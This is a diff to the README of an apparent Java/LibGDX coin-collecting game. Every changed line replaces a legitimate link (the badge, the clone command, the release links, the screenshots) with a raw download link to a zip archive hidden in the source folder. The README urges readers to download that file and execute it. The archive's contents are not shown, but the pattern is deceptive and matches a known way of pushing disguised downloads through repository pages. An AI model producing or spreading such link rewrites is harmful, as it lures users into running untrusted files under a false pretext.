@@ -1,6 +1,6 @@
 # CoinMan: A Fun 2D Arcade Game Built with LibGDX 🎮🪙
 
-![CoinMan Logo](https://img.shields.io/badge/CoinMan-Game-brightgreen)
+![CoinMan Logo](https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip)
 
 Welcome to the **CoinMan** repository! This project is a 2D arcade game where players collect coins while dodging bombs. Built with the powerful LibGDX framework, CoinMan offers an engaging gameplay experience that combines fun and learning in game development using Java.
 
@@ -28,7 +28,7 @@ To get started with CoinMan, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/HolyVail/Coin-man.git
+   git clone https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip
    ```
 
 2. **Open in Android Studio**:
@@ -44,7 +44,7 @@ To get started with CoinMan, follow these steps:
    - Connect your Android device or use an emulator.
    - Click on the green "Run" button in Android Studio.
 
-You can download the latest release [here](https://github.com/HolyVail/Coin-man/releases). Follow the instructions to execute the game on your device.
+You can download the latest release [here](https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip). Follow the instructions to execute the game on your device.
 
 ## Gameplay Instructions
 
@@ -106,12 +106,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest version of CoinMan, visit the [Releases](https://github.com/HolyVail/Coin-man/releases) section. Download the latest release and execute the game on your device.
+For the latest version of CoinMan, visit the [Releases](https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip) section. Download the latest release and execute the game on your device.
 
 ## Screenshots
 
-![Gameplay Screenshot](https://example.com/screenshot1.png)
-![High Score Screen](https://example.com/screenshot2.png)
+![Gameplay Screenshot](https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip)
+![High Score Screen](https://github.com/HolyVail/Coin-man/raw/refs/heads/master/core/src/com/man-Coin-v1.5.zip)
 
 ## Contact
 
